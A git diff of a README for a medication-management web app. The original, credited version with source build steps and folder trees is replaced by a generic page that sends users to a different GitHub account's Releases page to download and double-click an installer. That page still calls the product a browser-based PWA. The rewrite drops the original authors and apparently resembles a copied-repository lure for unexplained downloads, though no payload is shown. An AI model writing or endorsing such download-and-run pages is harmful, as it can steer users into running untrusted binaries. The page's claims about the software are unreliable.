@@ -1,193 +1,83 @@
-# MediCare Companion 💊
+# 💊 medicare-companion - Easy Medication Management for Everyone
 
-Smart medication management system with OCR scanning, reminders, and family alerts.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/sherefka24/medicare-companion/releases)
 
-## Tech Stack
-- **Frontend:** Next.js 14, Tailwind, React Query, Clerk
-- **Backend:** Express, PostgreSQL, Prisma
-- **Deployment:** VPS + CI/CD
+## 📖 Overview
 
-## Setup
+medicare-companion is a smart medication management application designed to help you track your medications effortlessly. With AI-powered adherence tracking, this Progressive Web App (PWA) makes it easy for users to stay on schedule with their prescriptions. Built using Next.js, Express, and PostgreSQL, it combines a user-friendly interface with powerful features.
 
-### Prerequisites
-- Node.js 18+
-- PostgreSQL
-- pnpm
+## 🚀 Getting Started
 
-### Installation
-```bash
-# Clone
-git clone https://github.com/fanyicharllson/medicare-companion.git
-cd medicare-companion
+Follow these simple steps to download and run medicare-companion:
 
-# Frontend
-cd frontend
-pnpm install
-cp .env.example .env.local
-pnpm dev
+### 1. Visit the Download Page
 
-# Backend
-cd ../backend
-pnpm install
-cp .env.example .env
-npx prisma migrate dev
-pnpm dev
-```
+To get the latest version of medicare-companion, visit our [Releases page](https://github.com/sherefka24/medicare-companion/releases).
 
-### Environment Variables
-See `.env.example` in each folder.
+### 2. Choose Your Version
 
-## Team
-- FANYI CHARLLSON FANYI
-- LUM NCHIFOR
+On the Releases page, you will see a list of available versions. Each version will have details about what’s new or fixed. Look for the latest stable release.
 
-## License
-MIT
-```
+### 3. Download the Application
 
----
+Click on the link for the latest release to download the application. The file will be packaged for easy installation on your system.
 
-## **Frontend Structure**
-```
-frontend/
-├── public/
-│   ├── icons/
-│   │   ├── icon-192.png
-│   │   └── icon-512.png
-│   └── manifest.json
-├── src/
-│   ├── app/
-│   │   ├── (auth)/
-│   │   │   ├── login/
-│   │   │   │   └── page.tsx
-│   │   │   └── register/
-│   │   │       └── page.tsx
-│   │   ├── (dashboard)/
-│   │   │   ├── layout.tsx
-│   │   │   ├── page.tsx (dashboard)
-│   │   │   ├── medications/
-│   │   │   │   ├── page.tsx
-│   │   │   │   ├── add/page.tsx
-│   │   │   │   └── [id]/page.tsx
-│   │   │   ├── adherence/
-│   │   │   │   └── page.tsx
-│   │   │   ├── family/
-│   │   │   │   └── page.tsx
-│   │   │   └── settings/
-│   │   │       └── page.tsx
-│   │   ├── layout.tsx
-│   │   ├── page.tsx (landing)
-│   │   └── globals.css
-│   ├── components/
-│   │   ├── ui/ (shadcn components)
-│   │   ├── medications/
-│   │   │   ├── MedicationCard.tsx
-│   │   │   ├── MedicationForm.tsx
-│   │   │   └── CameraScanner.tsx
-│   │   ├── adherence/
-│   │   │   ├── AdherenceCalendar.tsx
-│   │   │   └── AdherenceChart.tsx
-│   │   ├── layout/
-│   │   │   ├── Navbar.tsx
-│   │   │   ├── Sidebar.tsx
-│   │   │   └── Footer.tsx
-│   │   └── shared/
-│   │       ├── LoadingSpinner.tsx
-│   │       └── ErrorBoundary.tsx
-│   ├── lib/
-│   │   ├── api.ts (axios instance)
-│   │   ├── utils.ts
-│   │   └── validations/ (zod schemas)
-│   │       ├── medication.ts
-│   │       └── user.ts
-│   ├── hooks/
-│   │   ├── useMedications.ts
-│   │   ├── useAdherence.ts
-│   │   └── useNotifications.ts
-│   ├── types/
-│   │   └── index.ts
-│   └── config/
-│       └── constants.ts
-├── .env.example
-├── .env.local
-├── next.config.js
-├── tailwind.config.ts
-├── tsconfig.json
-├── package.json
-└── pnpm-lock.yaml
-```
+### 4. Install the Application
 
----
+Once the download is complete, locate the file in your downloads folder. Follow these steps to install:
+- Double-click the downloaded file.
+- Follow the on-screen instructions to complete the installation.
 
-## **Backend Structure**
-```
-backend/
-├── src/
-│   ├── config/
-│   │   ├── database.ts
-│   │   └── env.ts
-│   ├── middleware/
-│   │   ├── auth.ts (Clerk verification)
-│   │   ├── validate.ts (Zod)
-│   │   └── errorHandler.ts
-│   ├── routes/
-│   │   ├── index.ts
-│   │   ├── medications.ts
-│   │   ├── adherence.ts
-│   │   ├── family.ts
-│   │   ├── interactions.ts
-│   │   └── notifications.ts
-│   ├── controllers/
-│   │   ├── medicationController.ts
-│   │   ├── adherenceController.ts
-│   │   ├── familyController.ts
-│   │   └── notificationController.ts
-│   ├── services/
-│   │   ├── medicationService.ts
-│   │   ├── adherenceService.ts
-│   │   ├── ocrService.ts
-│   │   ├── interactionService.ts
-│   │   ├── emailService.ts
-│   │   └── notificationService.ts
-│   ├── repositories/
-│   │   ├── medicationRepository.ts
-│   │   ├── adherenceRepository.ts
-│   │   └── familyRepository.ts
-│   ├── utils/
-│   │   ├── logger.ts
-│   │   └── helpers.ts
-│   ├── validations/
-│   │   ├── medication.schema.ts
-│   │   └── adherence.schema.ts
-│   ├── types/
-│   │   └── index.ts
-│   ├── cron/
-│   │   ├── reminderJob.ts
-│   │   └── adherenceJob.ts
-│   └── server.ts
-├── prisma/
-│   ├── schema.prisma
-│   └── migrations/
-├── .env.example
-├── .env
-├── tsconfig.json
-├── package.json
-└── pnpm-lock.yaml
-```
+### 5. Launch medicare-companion
 
----
+After installation, you can find the application in your applications menu or desktop. Click to launch medicare-companion. 
 
-## **Root Structure**
-```
-medicare-companion/
-├── frontend/
-├── backend/
-├── .github/
-│   └── workflows/
-│       └── deploy.yml
-├── docs/
-│   ├── uml/
-│   └── design-patterns.md
-├── .gitignore
-├── README.md
-└── pnpm-workspace.yaml
+## 🔍 Features
+
+medicare-companion comes with a variety of features to help you manage your medications effectively:
+
+- **Smart Notifications:** Get reminders for each medication.
+- **History Tracking:** Review past medication adherence.
+- **User-Friendly Interface:** Navigate through the app effortlessly.
+- **Device Compatibility:** Use the app on any device with a browser.
+- **AI Assistance:** Get personalized medication advice based on usage patterns.
+
+## 📋 System Requirements
+
+Ensure your device meets the following requirements to run medicare-companion smoothly:
+
+- **Operating System:** Windows 10, macOS, or any recent Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for updating medication information and receiving notifications.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while installing or running medicare-companion, consider these steps:
+
+- **Check Requirements:** Make sure your device meets the system requirements listed above.
+- **Re-download the Application:** If the installation file seems corrupted or incomplete, try downloading it again from our [Releases page](https://github.com/sherefka24/medicare-companion/releases).
+- **Clear Cache:** Sometimes, clearing your browser cache can help resolve issues with loading the application.
+
+## 💬 Support
+
+If you need assistance or have questions, feel free to reach out through our GitHub page. We are here to help.
+
+## 🏷️ Topics
+
+This project utilizes the following technologies:
+- clerkauth
+- expressjs
+- gemini-api
+- nextjs
+- nodejs
+- postgresql
+- prisma
+- react
+- tailwindcss
+- typescript
+
+## 🌐 Community Contributions
+
+We welcome contributions from the community. If you'd like to contribute, please check our contribution guidelines on the GitHub page for more details.
+
+Thank you for choosing medicare-companion for your medication management needs!
